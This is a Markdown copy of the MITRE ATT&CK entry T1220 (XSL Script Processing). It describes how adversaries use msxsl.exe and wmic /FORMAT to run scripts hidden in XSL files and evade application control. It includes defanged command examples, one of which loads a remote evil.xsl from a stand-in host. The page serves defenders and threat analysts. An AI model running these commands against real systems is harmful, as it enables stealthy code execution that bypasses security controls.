---
mitre_data:
  id: T1220
  linker_tags:
  - mitre/attack/linker/stealth/xsl_script_processing
  name: XSL Script Processing
  related_tactics:
  - stealth
tags:
- mitre/attack/technique
---



# XSL Script Processing (`T1220`)

Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. [^fn6]

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) [^fn3] can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. [^fn4] Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. [^fn1] Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.[^fn5]

Command-line examples:[^fn4][^fn5]

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.[^fn2] This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1218/010)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.[^fn5]

Command-line examples:[^fn5][^fn2]

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>


# Platform(s)

- Windows

# Tactic(s)

- [[../Tactics/7. Stealth|Stealth]]


# External Reference(s)

- [T1220](https://attack.mitre.org/techniques/T1220)

[^fn1]: [Admin. (2018, March 2). Spear-phishing campaign leveraging on MSXSL. Retrieved July 3, 2018.](https://reaqta.com/2018/03/spear-phishing-campaign-leveraging-msxsl/)
[^fn2]: [LOLBAS. (n.d.). Wmic.exe. Retrieved July 31, 2019.](https://lolbas-project.github.io/lolbas/Binaries/Wmic/)
[^fn3]: [Microsoft. (n.d.). Command Line Transformation Utility (msxsl.exe). Retrieved July 3, 2018.](https://web.archive.org/web/20190508171106/https://www.microsoft.com/en-us/download/details.aspx?id=21714)
[^fn4]: [netbiosX. (2017, July 6). AppLocker Bypass – MSXSL. Retrieved July 3, 2018.](https://pentestlab.blog/2017/07/06/applocker-bypass-msxsl/)
[^fn5]: [Singh, A. (2019, March 14). MSXSL.EXE and WMIC.EXE — A Way to Proxy Code Execution. Retrieved August 2, 2019.](https://medium.com/@threathuntingteam/msxsl-exe-and-wmic-exe-a-way-to-proxy-code-execution-8d524f642b75)
[^fn6]: [Wenzel, M. et al. (2017, March 30). XSLT Stylesheet Scripting Using <msxsl:script>. Retrieved July 3, 2018.](https://docs.microsoft.com/dotnet/standard/data/xml/xslt-stylesheet-scripting-using-msxsl-script)